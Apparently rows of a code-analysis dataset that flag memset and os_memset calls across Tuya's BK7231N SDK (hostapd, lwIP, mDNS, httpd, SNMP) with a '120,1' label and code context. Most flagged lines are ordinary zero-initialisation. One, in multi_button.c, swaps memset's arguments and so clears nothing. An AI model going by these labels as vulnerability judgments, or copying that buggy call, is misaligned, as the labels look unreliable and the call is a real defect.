	report.tpc.len = 2;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd_intf\hostapd_intf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd_intf\hostapd_intf.c,"os_memset(&bcn_param, 0, sizeof(BCN_PARAM_ST));",120,1,"
    os_memcpy(bcn_buf, param->u.bcn_change.beacon, param->u.bcn_change.bcn_len);
    os_memset(&bcn_param, 0, sizeof(BCN_PARAM_ST));

    bcn_param.bcn_ptr = (u32 *)bcn_buf;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd_intf\hostapd_intf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd_intf\hostapd_intf.c,"os_memset(kmsg_dst, 0, (sizeof(struct ke_msg) + param_len));",120,1,"            goto kmsg_malloc_fail;
        }
        os_memset(kmsg_dst, 0, (sizeof(struct ke_msg) + param_len));

        kmsg_dst->id = ME_MGMT_TX_REQ;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"os_memset(&link_status, 0, sizeof(link_status));",120,1,"	uint32_t ssid_len;

	os_memset(&link_status, 0, sizeof(link_status));
	bk_wlan_get_link_status(&link_status);
	os_memset(&bssid_info, 0, sizeof(bssid_info));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"os_memset(&bssid_info, 0, sizeof(bssid_info));",120,1,"	os_memset(&link_status, 0, sizeof(link_status));
	bk_wlan_get_link_status(&link_status);
	os_memset(&bssid_info, 0, sizeof(bssid_info));

	ssid_len = os_strlen((const char*)link_status.ssid);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"os_memset(temp, 0, sizeof(temp));",120,1,"
	psk = wpas_get_sta_psk();
	os_memset(temp, 0, sizeof(temp));
	for(i = 0; i < 32; i++)
	{
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"os_memset(&inNetworkInitParaAdv, 0, sizeof(inNetworkInitParaAdv));",120,1,"	network_InitTypeDef_adv_st inNetworkInitParaAdv;

	os_memset(&inNetworkInitParaAdv, 0, sizeof(inNetworkInitParaAdv));
	
	os_strcpy((char*)inNetworkInitParaAdv.ap_info.ssid, (char*)bssid_info->ssid);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"os_memset(&g_rl_socket, 0, sizeof(g_rl_socket));",120,1,"	hit_sta = g_rl_socket.sta_req_flag;

	os_memset(&g_rl_socket, 0, sizeof(g_rl_socket));
    GLOBAL_INT_RESTORE();

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\joint_up\role_launch.c,"os_memset(&g_sta_cache, 0, sizeof(g_sta_cache));",120,1,"		}

		os_memset(&g_sta_cache, 0, sizeof(g_sta_cache));
	}while(0);
	
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\key\multi_button.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\key\multi_button.c,"memset(handle, sizeof(BUTTON_S), 0);",120,1,"void button_init(BUTTON_S* handle, uint8_t(*pin_level)(), uint8_t active_level)
{
	memset(handle, sizeof(BUTTON_S), 0);
	
	handle->event = (uint8_t)NONE_PRESS;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\libc\stdio\lib_libvscanf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\libc\stdio\lib_libvscanf.c,"memset(set, 0, 32);",120,1,"	}

	memset(set, 0, 32);
	if (c == 0)
	{
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\platform_stub.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\platform_stub.c,"os_memset(pvReturn, 0, a*b);",120,1,"    if (pvReturn)
    {
        os_memset(pvReturn, 0, a*b);
    }

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,"memset(&dhcps, 0, sizeof(dhcps));",120,1,"	int ret = 0;

	memset(&dhcps, 0, sizeof(dhcps));
	dhcps.msg = (char*)os_mem_alloc(SERVER_BUFFER_SIZE);
	if (dhcps.msg == NULL)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,"memset(pkt.targ_hw_addr, 0xff, ETH_HW_ADDR_LEN);",120,1,"	write_u32(pkt.rcpt_ip_addr, ip);

	memset(pkt.targ_hw_addr, 0xff, ETH_HW_ADDR_LEN);
	memset(pkt.rcpt_hw_addr, 0xff, ETH_HW_ADDR_LEN);
    get_mac_addr_from_interface((void*)pkt.sndr_hw_addr, dhcps.prv);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,"memset(pkt.rcpt_hw_addr, 0xff, ETH_HW_ADDR_LEN);",120,1,"
	memset(pkt.targ_hw_addr, 0xff, ETH_HW_ADDR_LEN);
	memset(pkt.rcpt_hw_addr, 0xff, ETH_HW_ADDR_LEN);
    get_mac_addr_from_interface((void*)pkt.sndr_hw_addr, dhcps.prv);
    get_mac_addr_from_interface((void*)pkt.src_hw_addr, dhcps.prv);   
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\dhcpd\dhcp-server.c,"memset(pkt.padding, 0, sizeof(pkt.padding));",120,1,"		return -1;
	}
	memset(pkt.padding, 0, sizeof(pkt.padding));

	if (lwip_sendto(sock, (char *)&pkt, sizeof(pkt), 0,
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,"memset(&address,0,sizeof(address));",120,1,"    struct wlan_ip_config address;

	memset(&address,0,sizeof(address));
	
    if(!sta_ip_start_flag)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,"memset(&addr, 0, sizeof(struct ipv4_config));",120,1,"	struct ipv4_config addr;
	
	memset(&addr, 0, sizeof(struct ipv4_config));
	if (dhcp == 1) {
		addr.addr_type = ADDR_TYPE_DHCP;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,"memset(&if_handle->ipaddr, 0, sizeof(ip_addr_t));",120,1,"	case ADDR_TYPE_DHCP:
		/* Reset the address since we might be transitioning from static to DHCP */
		memset(&if_handle->ipaddr, 0, sizeof(ip_addr_t));
		memset(&if_handle->nmask, 0, sizeof(ip_addr_t));
		memset(&if_handle->gw, 0, sizeof(ip_addr_t));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,"memset(&if_handle->nmask, 0, sizeof(ip_addr_t));",120,1,"		/* Reset the address since we might be transitioning from static to DHCP */
		memset(&if_handle->ipaddr, 0, sizeof(ip_addr_t));
		memset(&if_handle->nmask, 0, sizeof(ip_addr_t));
		memset(&if_handle->gw, 0, sizeof(ip_addr_t));
		netifapi_netif_set_addr(&if_handle->netif, &if_handle->ipaddr,
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\port\net.c,"memset(&if_handle->gw, 0, sizeof(ip_addr_t));",120,1,"		memset(&if_handle->ipaddr, 0, sizeof(ip_addr_t));
		memset(&if_handle->nmask, 0, sizeof(ip_addr_t));
		memset(&if_handle->gw, 0, sizeof(ip_addr_t));
		netifapi_netif_set_addr(&if_handle->netif, &if_handle->ipaddr,
				&if_handle->nmask, &if_handle->gw);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\api\netbuf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\api\netbuf.c,"memset(buf, 0, sizeof(struct netbuf));",120,1,"  buf = (struct netbuf *)memp_malloc(MEMP_NETBUF);
  if (buf != NULL) {
    memset(buf, 0, sizeof(struct netbuf));
  }
  return buf;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\api\netdb.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\api\netdb.c,"memset(ai, 0, total_size);",120,1,"    return EAI_MEMORY;
  }
  memset(ai, 0, total_size);
  /* cast through void* to get rid of alignment warnings */
  sa = (struct sockaddr_storage *)(void*)((u8_t*)ai + sizeof(struct addrinfo));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\api\sockets.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\api\sockets.c,"memset((sin)->sin_zero, 0, SIN_ZERO_LEN); }while(0)",120,1,"      (sin)->sin_port = lwip_htons((port)); \
      inet_addr_from_ip4addr(&(sin)->sin_addr, ipaddr); \
      memset((sin)->sin_zero, 0, SIN_ZERO_LEN); }while(0)
#define SOCKADDR4_TO_IP4ADDR_PORT(sin, ipaddr, port) do { \
    inet_addr_to_ip4addr(ip_2_ip4(ipaddr), &((sin)->sin_addr)); \
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\httpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\httpd.c,"memset(ret, 0, sizeof(struct http_ssi_state));",120,1,"#endif /* LWIP_HTTPD_KILL_OLD_ON_CONNECTIONS_EXCEEDED */
  if (ret != NULL) {
    memset(ret, 0, sizeof(struct http_ssi_state));
  }
  return ret;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\httpd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\httpd.c,"memset(hs, 0, sizeof(struct http_state));",120,1,"{
  /* Initialize the structure. */
  memset(hs, 0, sizeof(struct http_state));
#if LWIP_HTTPD_DYNAMIC_HEADERS
  /* Indicate that the headers are not yet valid */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(path, 0, sizeof(path));",120,1,"  strcpy(targetfile, ""fsdata.c"");

  memset(path, 0, sizeof(path));
  memset(appPath, 0, sizeof(appPath));

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(appPath, 0, sizeof(appPath));",120,1,"
  memset(path, 0, sizeof(path));
  memset(appPath, 0, sizeof(appPath));

  os_printf(NEWLINE "" makefsdata - HTML to C source converter"" NEWLINE);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(s_outbuf, 0, sizeof(s_outbuf));",120,1,"          exit(-1);
        }
        memset(s_outbuf, 0, sizeof(s_outbuf));
        status = tdefl_compress(&g_deflator, next_in, &in_bytes, next_out, &out_bytes, TDEFL_FINISH);
        if (status != TDEFL_STATUS_DONE) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(s_checkbuf, 0, sizeof(s_checkbuf));",120,1,"
            tinfl_init(&inflator);
            memset(s_checkbuf, 0, sizeof(s_checkbuf));
            dec_status = tinfl_decompress(&inflator, (const mz_uint8 *)ret_buf, &dec_in_bytes, s_checkbuf, (mz_uint8 *)next_out, &dec_out_bytes, 0);
            LWIP_ASSERT(""tinfl_decompress failed"", dec_status == TINFL_STATUS_DONE);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(hdr_buf, 0, sizeof(hdr_buf));",120,1,"  u8_t provide_last_modified = includeLastModified;

  memset(hdr_buf, 0, sizeof(hdr_buf));

  if (useHttp11) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(intbuf, 0, sizeof(intbuf));",120,1,"    char intbuf[MAX_PATH_LEN];
    int content_len = file_size;
    memset(intbuf, 0, sizeof(intbuf));
    cur_string = g_psHTTPHeaderStrings[HTTP_HDR_CONTENT_LENGTH];
    cur_len = strlen(cur_string);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(modbuf, 0, sizeof(modbuf));",120,1,"    struct stat stat_data;
    struct tm* t;
    memset(modbuf, 0, sizeof(modbuf));
    memset(&stat_data, 0, sizeof(stat_data));
    cur_string = modbuf;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\httpd\makefsdata\makefsdata.c,"memset(&stat_data, 0, sizeof(stat_data));",120,1,"    struct tm* t;
    memset(modbuf, 0, sizeof(modbuf));
    memset(&stat_data, 0, sizeof(stat_data));
    cur_string = modbuf;
    strcpy(modbuf, ""Last-Modified: "");
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\lwiperf\lwiperf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\lwiperf\lwiperf.c,"memset(conn, 0, sizeof(lwiperf_state_tcp_t));",120,1,"    return ERR_MEM;
  }
  memset(conn, 0, sizeof(lwiperf_state_tcp_t));
  conn->base.tcp = 1;
  conn->base.server = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\lwiperf\lwiperf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\lwiperf\lwiperf.c,"memset(s, 0, sizeof(lwiperf_state_tcp_t));",120,1,"    return NULL;
  }
  memset(s, 0, sizeof(lwiperf_state_tcp_t));
  s->base.tcp = 1;
  s->base.server = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(domain, 0, sizeof(struct mdns_domain));",120,1,"mdns_readname(struct pbuf *p, u16_t offset, struct mdns_domain *domain)
{
  memset(domain, 0, sizeof(struct mdns_domain));
  return mdns_readname_loop(p, offset, domain, 0);
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(&service->txtdata, 0, sizeof(struct mdns_domain));",120,1,"mdns_prepare_txtdata(struct mdns_service *service)
{
  memset(&service->txtdata, 0, sizeof(struct mdns_domain));
  if (service->txt_fn) {
    service->txt_fn(service, service->txt_userdata);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(question, 0, sizeof(struct mdns_question));",120,1,"    pkt->questions_left--;

    memset(question, 0, sizeof(struct mdns_question));
    res = mdns_read_rr_info(pkt, &question->info);
    if (res != ERR_OK) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(answer, 0, sizeof(struct mdns_answer));",120,1,"    pkt->answers_left--;

    memset(answer, 0, sizeof(struct mdns_answer));
    res = mdns_read_rr_info(pkt, &answer->info);
    if (res != ERR_OK) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(out, 0, sizeof(struct mdns_outpacket));",120,1,"mdns_init_outpacket(struct mdns_outpacket *out, struct mdns_packet *in)
{
  memset(out, 0, sizeof(struct mdns_outpacket));
  out->cache_flush = 1;
  out->netif = in->netif;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(&hdr, 0, sizeof(hdr));",120,1,"
    /* Write header */
    memset(&hdr, 0, sizeof(hdr));
    hdr.flags1 = DNS_FLAG1_RESPONSE | DNS_FLAG1_AUTHORATIVE;
    hdr.numanswers = lwip_htons(outpkt->answers);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(&announce, 0, sizeof(announce));",120,1,"  struct mdns_host* mdns = NETIF_TO_HOST(netif);

  memset(&announce, 0, sizeof(announce));
  announce.netif = netif;
  announce.cache_flush = 1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(mdns, 0, sizeof(struct mdns_host));",120,1,"  netif_set_client_data(netif, mdns_netif_client_id, mdns);

  memset(mdns, 0, sizeof(struct mdns_host));
  MEMCPY(&mdns->name, hostname, LWIP_MIN(MDNS_LABEL_MAXLEN, strlen(hostname)));
  mdns->dns_ttl = dns_ttl;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mdns\mdns.c,"memset(srv, 0, sizeof(struct mdns_service));",120,1,"  LWIP_ERROR(""mdns_resp_add_service: Alloc failed"", (srv != NULL), return ERR_MEM);

  memset(srv, 0, sizeof(struct mdns_service));

  MEMCPY(&srv->name, name, LWIP_MIN(MDNS_LABEL_MAXLEN, strlen(name)));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mqtt\mqtt.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\mqtt\mqtt.c,"memset(client, 0, sizeof(mqtt_client_t));",120,1,"  mqtt_client_t *client = (mqtt_client_t *)mem_malloc(sizeof(mqtt_client_t));
  if (client != NULL) {
    memset(client, 0, sizeof(mqtt_client_t));
  }
  return client;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_core.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_core.c,"memset(ip, 0, sizeof(*ip));",120,1,"    }

    memset(ip, 0, sizeof(*ip));
    IP_SET_TYPE(ip, IPADDR_TYPE_ANY);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_mib2_tcp.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_mib2_tcp.c,"memset(value, 0, 2*sizeof(u32_t)); */",120,1,"    return sizeof(*uint_ptr);
  case 17: /* tcpHCInSegs */
    memset(value, 0, 2*sizeof(u32_t)); /* not supported */
    return 2*sizeof(u32_t);
  case 18: /* tcpHCOutSegs */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\lwip_intf\lwip-2.0.2\src\apps\snmp\snmp_msg.c,"memset(&request, 0, sizeof(request));",120,1,"  struct snmp_request request;
   
  memset(&request, 0, sizeof(request));
  request.handle       = handle;
  request.source_ip    = source_ip;
"
